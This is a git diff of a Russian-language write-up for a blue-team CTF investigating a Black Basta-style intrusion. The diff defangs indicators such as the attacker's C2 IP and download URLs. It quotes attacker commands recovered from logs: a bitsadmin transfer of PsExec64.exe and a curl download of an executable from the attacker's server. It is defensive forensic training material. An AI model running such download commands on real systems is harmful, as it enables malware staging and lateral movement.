@@ -13,7 +13,7 @@ https://cyberdefenders.org/blueteam-ctf-challenges/black-basta/ (Splunk/CyberChe
 
 #### Вопрос 1. Сотрудник скачал ZIP-архив, содержащий вредоносный Excel-файл. Какой полный URL использовался для загрузки этого файла?
 
-**Ответ:**`http://54.93.105.22/Financial%20Records.zip`
+**Ответ:**`http://54[.]93[.]105[.]22/Financial%20Records.zip`
 (при поиске использовала событие Sysmon EventID=15, которое фиксирует маркер зоны безопасности `Zone.Identifier` для файлов, которые скачанны из интернета)
 
 <img width="600" height="250" alt="recor" src="https://github.com/user-attachments/assets/c6a12261-874f-4c22-b0bb-7cba40785751" />
@@ -122,7 +122,7 @@ Start-Process $env:LOCALAPPDATA\Temp\Pancake.jpg.exe
 
 #### Вопрос 11. Beacon использовался для связи с инфраструктурой управления злоумышленника (C2). Какой IP-адрес использовался для C2-коммуникации?
 
-**Ответ:**`54.93.105.22`
+**Ответ:**`54[.]93[.]105[.]22`
 (сопоставила процесс Pancake.jpg.exe с сетевыми событиями. Искала исходящие соединения от этого процесса)
 
 ---
@@ -146,7 +146,7 @@ Start-Process $env:LOCALAPPDATA\Temp\Pancake.jpg.exe
 
 **Фрагмент команды:**
 ``
-cmd.exe /C bitsadmin /transfer "d" https://raw.githubusercontent.com/davehardy20/sysinternals/refs/heads/master/PsExec64.exe C:\Users\knixon\AppData\Local\Temp\PsExec64.exe
+cmd.exe /C bitsadmin /transfer "d" https://raw[.]githubusercontent[.]com/davehardy20/sysinternals/refs/heads/master/PsExec64.exe C:\Users\knixon\AppData\Local\Temp\PsExec64.exe
 ``
 
 #### Вопрос 14. Для загрузки файлов на DC01 злоумышленник использовал легитимный консольный инструмент. Какой инструмент применялся для загрузки файлов на эту машину?
@@ -156,7 +156,7 @@ cmd.exe /C bitsadmin /transfer "d" https://raw.githubusercontent.com/davehardy20
 
 **Фрагмент команды:**
 ``
-cmd.exe /C curl -o "C:\Users\swhite\AppData\Local\Temp\6as98v.exe" http://54.93.105.22/6as98v.exe
+cmd.exe /C curl -o "C:\Users\swhite\AppData\Local\Temp\6as98v.exe" http://54[.]93[.]105[.]22/6as98v.exe
 ``
 
 #### Вопрос 15. Злоумышленник просканировал внутреннюю сеть для поиска дополнительных целей. Какая полная команда была выполнена для сетевого обнаружения?
